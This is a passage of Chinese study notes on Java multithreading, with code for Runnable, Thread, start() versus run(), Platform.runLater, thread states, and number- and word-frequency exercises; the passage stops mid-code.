可运行对象通常用于多线程编程。通过将任务的代码放在 run() 方法中，可以将任务的执行和线程的控制分离开来，这是一种符合单一职责原则的设计。</p>
  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyRunnable</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 定义任务</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>线程<br>
线程是程序执行流的最小单元。它是进程中的一个实体，是被系统独立调度和分派的基本单位。线程自己不拥有系统资源，只拥有一点在运行中必不可少的资源（如程序计数器、一组寄存器和栈），但它可以与同属一个进程的其他线程共享进程所拥有的全部资源。<br>
线程在运行时具有自己的执行路径，而且可以与其他线程并发执行。使用线程可以实现异步处理和并行处理，提高程序的执行效率和响应速度。但是，线程的使用也带来了线程安全、死锁等多线程编程中的复杂问题，需要仔细处理。</p>
<p>可以通过两种方式实现：</p>
<ol>
<li>
<p>继承 Thread 类：通过继承 Thread 类并重写其 run() 方法来定义线程的行为。</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyThread</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token comment">// 定义线程执行的任务</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>实现 Runnable 接口：更通用的方式是实现 Runnable 接口并将其实例传递给 Thread 类的实例。</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">MyRunnable</span> myRunnable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyRunnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Thread</span> thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>myRunnable<span class="token punctuation">)</span><span class="token punctuation">;</span>
thread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 启动线程</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
</li>
</ul>
<h2 id="如何定义一个任务类如何为任务创建一个线程"><a class="markdownIt-Anchor" href="#如何定义一个任务类如何为任务创建一个线程"></a> 如何定义一个任务类?如何为任务创建一个线程?</h2>
<p>见上</p>
<h2 id="run换成start"><a class="markdownIt-Anchor" href="#run换成start"></a> run()换成start()</h2>
<ul>
<li>使用 start() 方法：<br>
当你调用 start() 方法时，它会启动一个新的线程，并在新线程中执行 run() 方法。<br>
多个线程同时执行，实现并发执行，可以提高程序的效率。<br>
start() 方法不会阻塞当前线程，而是立即返回。</li>
<li>使用 run() 方法：<br>
直接调用 run() 方法不会启动新线程，而是在当前线程中执行 run() 方法的内容。<br>
不会实现多线程的并发执行，而是按照顺序依次执行。</li>
</ul>
<p>Start：乱序执行<br>
Run：顺序执行</p>
<h2 id="如下代码有什么错误"><a class="markdownIt-Anchor" href="#如下代码有什么错误"></a> 如下代码有什么错误？</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 原</span>
<span class="token comment">// 在构造器 Test() 中，有一个无限递归的调用。new Test(); 这个调用会不断地创建 Test 类的新实例，并且每个新实例又会创建更多的实例，最终导致 StackOverflowError</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">Test</span> task <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token function">thread</span><span class="token punctuation">(</span>task<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 改</span>
<span class="token comment">// 为了避免无限递归，应该在 main 方法中创建一个 Test 对象，并从那里开始执行线程。</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Test</span> task <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>task<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 原</span>
<span class="token comment">// 在构造器 Test() 中，尝试启动同一个线程两次。在 Java 中，一个线程只能被启动一次，第二次调用 start() 会抛出 IllegalThreadStateException。</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Thread</span> t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 改</span>
<span class="token comment">// 删除第二次调用 t.start();，以确保线程只被启动一次。</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Thread</span> t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="使用platformrunlater的目的是什么"><a class="markdownIt-Anchor" href="#使用platformrunlater的目的是什么"></a> 使用Platform.runLater的目的是什么？</h2>
<p>用于确保一个 Runnable 对象的 run 方法将在 JavaFX 的主线程（也称为 GUI 线程或事件派发线程）上运行。<br>
在 JavaFX 中，与 UI 相关的操作必须在主线程上执行以防止线程冲突和不一致的 UI 更新。<br>
使用情形：</p>
<ol>
<li>从非GUI线程更新UI<br>
如果在后台线程中执行长时间运行的任务，并且需要更新 UI（如进度条、文本标签等），应该使用 Platform.runLater 来确保这些更新在正确的线程上执行。</li>
<li>延迟UI操作<br>
有时可能希望在应用程序的其他部分已经完全启动和渲染后才执行某些 UI 操作。Platform.runLater 可以用来排队这些操作，直到主线程准备好执行它们。</li>
<li>避免线程问题：<br>
由于JavaFX的UI组件不是线程安全的，尝试从另一个线程修改它们会导致运行时错误。Platform.runLater 可以保证在主线程上执行修改，从而避免这些问题。</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 假设我们在一个后台线程中完成了一些工作，现在需要更新UI</span>
<span class="token class-name">Thread</span> backgroundThread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// 执行一些耗时任务</span>
    <span class="token comment">// ...</span>
    <span class="token comment">// 现在需要更新UI，使用Platform.runLater</span>
    <span class="token class-name">Platform</span><span class="token punctuation">.</span><span class="token function">runLater</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
        <span class="token comment">// 这段代码现在在JavaFX主线程上执行</span>
        label<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"任务完成！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
backgroundThread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 在这个例子中，后台线程完成一些工作后，使用 Platform.runLater 来更新一个标签（label）的文本。这个 Runnable 会被安排在 JavaFX 主线程上执行，从而安全地更新 UI 组件。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="可以将代码替换为-platformrunlatere-lbltextsettexttext"><a class="markdownIt-Anchor" href="#可以将代码替换为-platformrunlatere-lbltextsettexttext"></a> 可以将代码替换为 Platform.runLater(e-&gt; lblText.setText(text))</h2>
<p>可以</p>
<h2 id="什么是线程状态描述一个线程的状态"><a class="markdownIt-Anchor" href="#什么是线程状态描述一个线程的状态"></a> 什么是线程状态？描述一个线程的状态</h2>
<table>
<thead>
<tr>
<th>线程状态</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>新建 (New)</td>
<td>线程已经被创建，但是还没有开始执行（还没有调用 start() 方法）。</td>
</tr>
<tr>
<td>可运行 (Runnable)</td>
<td>线程可能正在运行，也可能正在等待CPU分配时间片，这取决于线程调度器</td>
</tr>
<tr>
<td>阻塞 (Blocked)</td>
<td>线程被阻止，等待监视器锁（进入同步块或方法）。</td>
</tr>
<tr>
<td>等待 (Waiting)</td>
<td>线程在等待另一个线程执行一个（无时间限制的）操作。例如，调用了 Object.wait()、Thread.join() 或 LockSupport.park()。</td>
</tr>
<tr>
<td>定时等待 (Timed Waiting)</td>
<td>线程在等待另一个线程执行一个（有时间限制的）操作。例如，调用了 Thread.sleep()、Object.wait() 带有时间的版本、Thread.join() 带有时间的版本或 LockSupport.parkNanos()/parkUntil()。</td>
</tr>
<tr>
<td>终止 (Terminated)</td>
<td>线程的 run() 方法执行完成，线程正常结束或者出现异常导致结束。</td>
</tr>
</tbody>
</table>
<ol>
<li>
<p><strong>新建状态 (New)</strong></p>
<ul>
<li><code>Thread thread = new Thread(runnableTask);</code> 创建线程对象 <code>thread</code>。</li>
</ul>
</li>
<li>
<p><strong>可运行状态 (Runnable)</strong></p>
<ul>
<li><code>thread.start();</code> 线程可以被运行。</li>
<li>线程可能正在运行，也可能正在等待 CPU 分配时间。</li>
</ul>
</li>
<li>
<p><strong>阻塞状态 (Blocked)</strong></p>
<ul>
<li>线程试图进入同步块，但该块被其他线程锁定。</li>
</ul>
</li>
<li>
<p><strong>等待状态 (Waiting)</strong></p>
<ul>
<li>线程在对象上调用 <code>wait()</code>，等待其他线程的通知。</li>
</ul>
</li>
<li>
<p><strong>定时等待状态 (Timed Waiting)</strong></p>
<ul>
<li>线程调用 <code>sleep()</code> 或 <code>wait(long timeout)</code> 等，有一定的时限。</li>
</ul>
</li>
<li>
<p><strong>终止状态 (Terminated)</strong></p>
<ul>
<li>线程的 <code>run()</code> 方法执行完毕，或者线程被中断。</li>
</ul>
</li>
</ol>
<h2 id="统计输入数字的个数编写一个程序读取个数不定的整数然后查找其中出现频率最高的数字-当输人为0时表示结束输人-如果出现频率最高的数字不是一个而是多个则应该将它们全部报告"><a class="markdownIt-Anchor" href="#统计输入数字的个数编写一个程序读取个数不定的整数然后查找其中出现频率最高的数字-当输人为0时表示结束输人-如果出现频率最高的数字不是一个而是多个则应该将它们全部报告"></a> (统计输入数字的个数)编写一个程序，读取个数不定的整数，然后查找其中出现频率最高的数字。当输人为0时，表示结束输人。如果出现频率最高的数字不是一个而是多个，则应该将它们全部报告</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FrequencyCounter</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Scanner</span> scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> numberFrequency <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> maxFrequency <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"输入数字 (到 0 终止):"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> num <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">int</span> currentFrequency <span class="token operator">=</span> numberFrequency<span class="token punctuation">.</span><span class="token function">getOrDefault</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            numberFrequency<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> currentFrequency<span class="token punctuation">)</span><span class="token punctuation">;</span>
            maxFrequency <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>maxFrequency<span class="token punctuation">,</span> currentFrequency<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 找到所有出现频率最高的数字</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> maxNumbers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> entry <span class="token operator">:</span> numberFrequency<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> maxFrequency<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                maxNumbers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 报告结果</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"频次最高为"</span> <span class="token operator">+</span> maxFrequency <span class="token operator">+</span><span class="token string">", 对应的数字为"</span><span class="token operator">+</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> num <span class="token operator">:</span> maxNumbers<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        scanner<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-output" data-language="output"><code class="language-output">输出：
输入数字 (到 0 终止):
1 2 3 2 2 3 3 0
频次最高为3, 对应的数字为:
2
3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="改写程序清单21-9改写程序清单21-9将单词按出现频率的升序显示"><a class="markdownIt-Anchor" href="#改写程序清单21-9改写程序清单21-9将单词按出现频率的升序显示"></a> (改写程序清单21-9)改写程序清单21-9，将单词按出现频率的升序显示</h2>
<p>提示:创建一个名为 WordOccurence 的类实现Comparable接口。这个类包含两个域:word和count。使用compareTo方法比较单词的出现次数。对程序清单21-9 散列集中的每个对创建WordOccurence的一个实例，并把它储存到一个数组线性表中。使用Collections.sort 方法对该数组线性表进行排序。如果将WordOccurence的实例存入树形集，会发生什么错误?</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">Collectors</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WordCounter</span> <span class="token punctuation">{</span>
 <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token class-name">String</span> text <span class="token operator">=</span> <span class="token string">"The using directive in the example "</span> <span class="token operator">+</span>
    <span class="token string">"enables you to use the library identifiers "</span> <span class="token operator">+</span>
    <span class="token string">"without having to write out the namespace prefix "</span> <span class="token operator">+</span>
    <span class="token string">"oneapi::tbb before each identifier. "</span> <span class="token operator">+</span>
    <span class="token string">"The rest of the examples assume that such a using directive is present."</span><span class="token punctuation">;</span>

  <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">WordOccurrence</span><span class="token punctuation">&gt;</span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// 正则分词</span>
  <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> words <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"\\W+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> word <span class="token operator">:</span> words<span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token class-name">String</span> key <span class="token operator">=</span> word<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

   map<span class="token punctuation">.</span><span class="token function">computeIfAbsent</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> k <span class="token operator">-&gt;</span> <span class="token keyword">new</span> <span class="token class-name">WordOccurrence</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
     <span class="token punctuation">.</span><span class="token function">incrementCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  map<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>v <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// Use Stream API to sort and collect the words by frequency</span>
  <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">WordOccurrence</span><span class="token punctuation">&gt;</span></span> sortedByFrequency <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">sorted</span><span class="token punctuation">(</span><span class="token class-name">Comparator</span><span class="token punctuation">.</span><span class="token function">comparingInt</span><span class="token punctuation">(</span><span class="token class-name">WordOccurrence</span><span class="token operator">::</span><span class="token function">getCount</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reversed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sortedByFrequency<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">WordOccurrence</span> <span class="token keyword">implements</span> <span class="token class-name">Comparable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">WordOccurrence</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
 <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> word<span class="token punctuation">;</span>
 <span class="token keyword">private</span> <span class="token keyword">int</span> count<span class="token punctuation">;</span>

 <span class="token keyword">public</span> <span class="token class-name">WordOccurrence</span><span class="token punctuation">(</span><span class="token class-name">String</span> word<span class="token punctuation">,</span> <span class="token keyword">int</span> count<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>word <span class="token operator">=</span> word<span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>count <span class="token operator">=</span> count<span class="token punctuation">;</span>
 <span class="token punctuation">}</span>

 <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">incrementCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token operator">++</span><span class="token punctuation">;</span>
